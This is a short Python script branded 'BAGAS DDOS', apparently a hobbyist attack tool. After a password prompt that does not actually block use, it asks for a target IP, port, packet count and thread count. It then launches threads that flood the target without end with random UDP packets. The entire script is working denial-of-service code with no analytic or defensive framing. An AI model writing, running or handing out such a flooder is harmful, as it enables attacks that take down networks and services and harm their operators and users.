import random
import socket
import threading
import os,sys
import time

os.system("clear")
password = "BagasGanteng"

for i in range(3):
	pwd = input("\033[91m===> PW NYA BAGASGANTENG : ")
	j=3
	if(pwd==password):
		time.sleep(3)
		print("\033[91m===> Pw Benar BagasGanteng ")
		break
	else:
		time.sleep(5)
		print("\033[91m===> PW nya salah BagasGanteng ")
		continue
time.sleep(3)
print("\033[91m> Pw Nya Yang Benar BagasGanteng")
os.system("clear")

 
print("\033[91m")
print("TUNGGU 5 DETIK BAGAS GANTENG")
time.sleep(5)

os.system("clear")
print("==========================")
print("        BAGAS DDOS        ")
print("      DDOS BY BAGAS       ")
print("       BAGAS ATTACK       ")
print("==========================")
print("                          ")
ip = str(input(" IP: "))
port = int(input(" PORT: "))
choice = str(input(" GASS?(y/n): "))
times = int(input(" PACKETS: "))
threads = int(input(" THREADS: "))
def bagas():

  data = random._urandom(900)

  i = random.choice(("[X]","[X]","[X]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"BAGAS ATTACK THIS IP %s PORT %s"%(ip,port))
    except:
      print("[X]BAGAS ATTACK THIS IP %s PORT %s"%(ip,port))
    
def bagas2():

  data = random._urandom(1000)

  i = random.choice(("[X]","[X]","[X]"))
  while True:
    try:
      s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
      addr = (str(ip),int(port))
      for x in range(times):
        s.sendto(data,addr)
      print(i +"BAGAS ATTACK THIS IP %s PORT %s"%(ip,port))
    except:
      s.close()
      print("[X]BAGAS ATTACK THIS IP %s PORT %s"%(ip,port))

for y in range(threads):
  if choice == 'y':
    th = threading.Thread(target = bagas)
    th.start()
  else:
    th = threading.Thread(target = bagas2)
    th.start()